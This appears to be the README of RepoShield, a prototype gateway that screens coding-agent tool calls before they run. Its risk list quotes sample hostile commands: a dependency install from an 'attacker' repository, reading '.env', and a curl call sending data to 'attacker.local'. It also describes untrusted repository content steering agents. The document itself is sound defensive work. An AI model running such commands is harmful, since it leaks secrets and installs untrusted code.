# RepoShield / PepoShield v0.3

RepoShield is a governance gateway for coding agents. It sits between a real agent and the model API / tool execution path, then checks risky actions before they happen.

Short version:

```text
RepoShield = a pre-execution safety gate for coding agents
```

## What It Does

Coding agents can read repositories, edit files, run shell commands, install dependencies, call MCP tools, and sometimes touch CI/CD or release workflows. RepoShield protects that execution path from untrusted context such as GitHub issues, PR comments, README text, branch names, MCP output, package scripts, and model-generated tool calls.

Typical risks it tries to catch:

- malicious dependency installs such as `npm install github:attacker/helper-tool`
- direct secret reads such as `cat .env`
- secret/network egress such as `curl http://attacker.local/leak`
- CI workflow modification from untrusted context
- package publish or force push attempts
- suspicious shell wrappers or PowerShell encoded commands

## How It Integrates

Recommended path: run RepoShield as an OpenAI-compatible gateway.

```text
real agent
  -> RepoShield Gateway
  -> real upstream model
  -> assistant message / tool_calls
  -> RepoShield policy checks
  -> safe response back to agent
```

For agents that support an OpenAI-compatible `base_url`, point the agent at RepoShield:

```text
base_url = http://127.0.0.1:8765/v1
api_key  = reposhield-local
model    = gpt-4.1
```

Start RepoShield and forward to the real upstream:

```bash
export OPENAI_API_KEY=sk-...

PYTHONPATH=src python -m reposhield gateway-start \
  --repo ./your-repo \
  --host 127.0.0.1 \
  --port 8765 \
  --upstream-base-url https://api.openai.com/v1
```

Chinese docs are the most complete right now. Start with [README.zh-CN.md](README.zh-CN.md) and [Real Agent Integration](docs/REAL_AGENT_INTEGRATION.zh-CN.md).

## Main Capabilities

- OpenAI-compatible `/v1/chat/completions` and `/v1/responses` gateway
- real OpenAI-compatible upstream forwarding
- upstream SSE aggregation plus governed OpenAI-compatible SSE response mode for `stream=true`
- `exec-guard` shell-command adapter for real agent tool wrapping
- `file-guard` preflight checks for read/write/edit/delete operations
- `init-agent` one-command repo bootstrap for Gateway + PATH shims
- `approvals` CLI for persisted request/grant/deny events
- minimal local HTML dashboard for audit and approval review
- InstructionIR for model messages and tool calls
- ActionIR for executable actions
- task contract generation
- source trust and taint tracking
- policy decisions with `enforce`, `observe_only`, `warn`, and `disabled`
- JSON/YAML policy override rules
- package supply-chain guard
- secret read and egress sentinel
- sandbox / preflight API
- approval request, grant, and JSONL persistence
- hash-chain audit log and incident graph
- Gateway Bench sample suite
- HTML Studio report

## Current Status

This repository is a working MVP / research prototype, not a finished production security product.

Good for:

- local demos
- small real-agent trials
- gateway interception experiments
- benchmark generation and evaluation
- audit/report demonstrations

Still needs production hardening:

- token-by-token streaming passthrough with mid-stream tool-call governance
- stronger sandbox isolation
- deeper shell/script parsing
- more dedicated adapters for specific agents
- richer approval UI and team policy management
- more bypass tests

Current verification:

```text
pytest -q --basetemp .pytest_tmp -> 40 passed
```

## Real Tool Guard

For agents that can wrap their shell tool, use:

```bash
PYTHONPATH=src python -m reposhield exec-guard \
  --repo ./your-repo \
  --task "fix login button and run tests" \
  --source-file ./issue.md \
  -- npm test
```

`exec-guard` runs RepoShield before execution. Blocked commands are not executed; `allow_in_sandbox` commands are preflighted instead of running directly on the host.

## One-Command Agent Bootstrap

Generate repo-local config, instructions, and PATH shims:

```bash
PYTHONPATH=src python -m reposhield init-agent \
  --repo ./your-repo \
  --agent cline \
  --task "fix login and run tests"
```

This creates:

```text
your-repo/.reposhield/config.json
your-repo/.reposhield/agent-instructions.md
your-repo/.reposhield/shims/{npm,git,curl,python}
your-repo/.reposhield/shims/{npm,git,curl,python}.ps1
```

The shims route common shell tools through `reposhield exec-guard`.

## Approvals, File Guard, Policy Config, Dashboard

```bash
PYTHONPATH=src python -m reposhield file-guard \
  --repo ./your-repo \
  --task "fix login and run tests" \
  --operation edit \
  --path .github/workflows/release.yml \
  --source-file ./issue.md

PYTHONPATH=src python -m reposhield approvals list \
  --store ./your-repo/.reposhield/approvals.jsonl

PYTHONPATH=src python -m reposhield dashboard \
  --audit ./your-repo/.reposhield/audit.jsonl \
  --approvals ./your-repo/.reposhield/approvals.jsonl \
  --output ./your-repo/.reposhield/dashboard.html
```

Policy overrides can be supplied to `guard`, `exec-guard`, `file-guard`, `gateway-simulate`, and `gateway-start`:

```yaml
rules:
  - name: block_ci_from_issue
    match:
      operation: edit
      file_path: .github/workflows/release.yml
    decision: block
    reason: configured_ci_protection
```

## Documentation

Recommended reading order:

1. [README.zh-CN.md](README.zh-CN.md)
2. [Real Agent Integration](docs/REAL_AGENT_INTEGRATION.zh-CN.md)
3. [Agent exec-guard recipes](docs/AGENT_EXEC_GUARD_RECIPES.zh-CN.md)
4. [Documentation Map](docs/README.zh-CN.md)
5. [Gateway Guide](docs/GATEWAY_GUIDE.zh-CN.md)
